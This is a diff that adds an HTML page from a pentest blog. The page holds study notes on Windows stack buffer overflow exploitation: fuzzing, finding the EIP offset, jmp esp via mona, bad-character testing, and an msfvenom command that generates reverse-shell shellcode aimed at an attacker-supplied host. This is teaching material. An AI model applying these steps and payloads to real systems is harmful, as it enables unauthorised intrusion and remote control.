@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - Buffer Overflow Development // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - Buffer Overflow Development"/>
+<meta name="twitter:description" content="Understanding the registers ESP: keeps track of most recently referenced location on the stack (top of the stack), dynamic EBP: stores a pointer to the top of the stack when a function is called, fixed for the frame EIP: points to the next instruction, usually targeted Common MS protections DEP: Data Execution Prevention, prevent code execution from data pages ASLR: Address Space Layout Randomisation, randomise base addresses of app and dll on boot Older OS such as XP does not have this CFG: Control Flow Guard, performs validation of indirect code branching, prevents pointer overwrites BOF Methodology FUZZ THE APPLICATION FINDING THE EIP OFFSET CONTROL THE EIP CHECK FOR BAD CHARACTERS FINDING A RETURN ADDRESS - JMP ESP SHELL CODE GENERATION Find entry point and offset Run the app (service) and find entry point (may use wireshark) Fuzz to find bof offset, roughly the range, this may trigger error on the return address Genereate patterns to substitute the buffer &gt; /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create."/>
+
+    <meta property="og:title" content="Notes - Buffer Overflow Development" />
+<meta property="og:description" content="Understanding the registers ESP: keeps track of most recently referenced location on the stack (top of the stack), dynamic EBP: stores a pointer to the top of the stack when a function is called, fixed for the frame EIP: points to the next instruction, usually targeted Common MS protections DEP: Data Execution Prevention, prevent code execution from data pages ASLR: Address Space Layout Randomisation, randomise base addresses of app and dll on boot Older OS such as XP does not have this CFG: Control Flow Guard, performs validation of indirect code branching, prevents pointer overwrites BOF Methodology FUZZ THE APPLICATION FINDING THE EIP OFFSET CONTROL THE EIP CHECK FOR BAD CHARACTERS FINDING A RETURN ADDRESS - JMP ESP SHELL CODE GENERATION Find entry point and offset Run the app (service) and find entry point (may use wireshark) Fuzz to find bof offset, roughly the range, this may trigger error on the return address Genereate patterns to substitute the buffer &gt; /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/notes/6a-bof/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-05T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-05T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Notes - Buffer Overflow Development</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 5, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="understanding-the-registers">Understanding the registers</h1>
+<ul>
+<li>ESP: keeps track of most recently referenced location on the stack (top of the stack), dynamic</li>
+<li>EBP: stores a pointer to the top of the stack when a function is called, fixed for the frame</li>
+<li>EIP: points to the next instruction, usually targeted</li>
+</ul>
+<h1 id="common-ms-protections">Common MS protections</h1>
+<ul>
+<li>DEP: Data Execution Prevention, prevent code execution from data pages</li>
+<li>ASLR: Address Space Layout Randomisation, randomise base addresses of app and dll on boot
+<ul>
+<li>Older OS such as XP does not have this</li>
+</ul>
+</li>
+<li>CFG: Control Flow Guard, performs validation of indirect code branching, prevents pointer overwrites</li>
+</ul>
+<h1 id="bof-methodology">BOF Methodology</h1>
+<ul>
+<li>FUZZ THE APPLICATION</li>
+<li>FINDING THE EIP OFFSET</li>
+<li>CONTROL THE EIP</li>
+<li>CHECK FOR BAD CHARACTERS</li>
+<li>FINDING A RETURN ADDRESS - JMP ESP</li>
+<li>SHELL CODE GENERATION</li>
+</ul>
+<h2 id="find-entry-point-and-offset">Find entry point and offset</h2>
+<ul>
+<li>Run the app (service) and find <code>entry point</code> (may use wireshark)</li>
+<li>Fuzz to find bof <code>offset</code>, roughly the range, this may trigger error on the return address</li>
+<li>Genereate patterns to substitute the buffer</li>
+</ul>
+<pre tabindex="0"><code>&gt; /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 64
+</code></pre><h2 id="control-eip">Control EIP</h2>
+<ul>
+<li>Control the <code>EIP</code> value in the pattern (offset), remeber <code>little endianess</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q Ab1A -l 64
+</code></pre><h2 id="control-esp">Control ESP</h2>
+<ul>
+<li>Test the theory using <code>AAAABBBB</code> as the buffer, <code>EIP</code> should be <code>BBBB</code>
+<ul>
+<li>You can extend the buffer a bit to <code>CCCCDDDDEEEEFFFF</code> to see whether ESP can be controlled as well</li>
+<li>Redirect to <code>ESP</code> (i.e <code>jmp esp</code>) is one way of exploiting</li>
+</ul>
+</li>
+<li>Find a static library that has <code>jmp esp</code> using <code>mona modules</code> in Immunity Debugger to find dll/executables
+<ul>
+<li>Ensure ASLR is off and the address doesn&rsquo;t contain a bad character</li>
+<li>Check the base address doesn&rsquo;t contain bad characters</li>
+<li>Check the target dll/executable has SafeSEH, ASLR NXCompat (DEP) disabled</li>
+</ul>
+</li>
+<li>Open <code>Immunity Debugger</code> and run the mona modules to ensure the above conditions. Base addresses can also be found from <code>/proc/&lt;id&gt;/maps</code> on linux.</li>
+</ul>
+<pre tabindex="0"><code>&gt; !mona modules
+</code></pre><ul>
+<li>Find <code>jmp esp</code> op code (i.e <code>FFE4</code>)</li>
+</ul>
+<pre tabindex="0"><code>&gt; /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
+&gt; !mona find -s &#34;\xff\xe4&#34; -m &#34;&lt;module&gt;&#34;    `jmp esp`
+&gt; !mona find -s &#34;\xff\xd4&#34; -m &#34;&lt;module&gt;&#34;    `call esp`
+&gt; !mona jmp -r esp -cpb &#34;&lt;bad-chars&gt;&#34;       check the log data
+</code></pre><ul>
+<li>Overrite <code>EIP</code> with a static address to <code>jmp esp</code> (equivalent ops <code>call esp</code>), note the endianess.</li>
+</ul>
+<pre tabindex="0"><code>* x86 AMD64: little endian
+* Sparc, PowerPC: big endian
+</code></pre><h2 id="find-space-for-buffer">Find space for buffer</h2>
+<ul>
+<li>Extend the buffer to check for space availability</li>
+<li>If there is enough space, just do <code>EIP -&gt; JMP ESP -&gt; SHELLCODE</code></li>
+<li>If not enough space (~350 bytes), consider a staged approach, <code>EIP -&gt; JMP ESP -&gt; JMP ECX/EAX -&gt; SHELLCODE</code></li>
+</ul>
+<h2 id="test-for-bad-characters">Test for bad characters</h2>
+<ul>
+<li><code>\x00</code> is usually a bad char, it&rsquo;s not included in the <code>badchars</code> list below</li>
+<li>Look for missing chars in the stack, be patient repeat many times</li>
+<li>May need to go back to <code>jmp esp</code> if the previous address contains a bad char</li>
+<li>Immunity debugger has a module to compare for bad characters</li>
+</ul>
+<pre tabindex="0"><code>&gt; !mona compare -f &lt;file&gt; -a &lt;esp-address&gt;
+&gt; !mona compare -f &lt;file&gt; -a esp
+</code></pre><h2 id="shellcode">shellcode</h2>
+<ul>
+<li>If cannot use generic shell code, must encode it, e.g <code>-e x86/shikata_ga_nai</code></li>
+<li>Keep some <code>nops sled</code> before the shellcode for the decoding operation &ldquo;\x90&rdquo; * 16</li>
+<li>Generate the shellcode</li>
+</ul>
+<pre tabindex="0"><code>&gt; msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=&lt;ip&gt; LPORT=4444 -b &#39;{bad_char}&#39; -e x86/shikata_ga_nai -f python -v shellcode
+</code></pre><ul>
+<li>For improvement, can use <code>EXITFUNC=thread</code> to be able to repeatedly run the exploit without terminating the main app.</li>
+</ul>
+<h1 id="all-characters-in-python">All characters in python</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>badchars <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><h1 id="references">References</h1>
+<ul>
+<li><a href="https://github.com/gh0x0st/Buffer_Overflow">https://github.com/gh0x0st/Buffer_Overflow</a></li>
+<li><a href="https://viperone.gitbook.io/pentest-everything/resources-1/buffer-overflow">https://viperone.gitbook.io/pentest-everything/resources-1/buffer-overflow</a></li>
+</ul>
+<h1 id="common-instructions">Common instructions</h1>
+<ul>
+<li>return 0</li>
+</ul>
+<pre tabindex="0"><code>&gt; MOV EAX,0
+</code></pre><ul>
+<li>main function epologue</li>
+</ul>
+<pre tabindex="0"><code>&gt; leave
+&gt; retn
+or
+&gt; mov esp, ebp
+&gt; pop	ebp
+&gt; ret
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
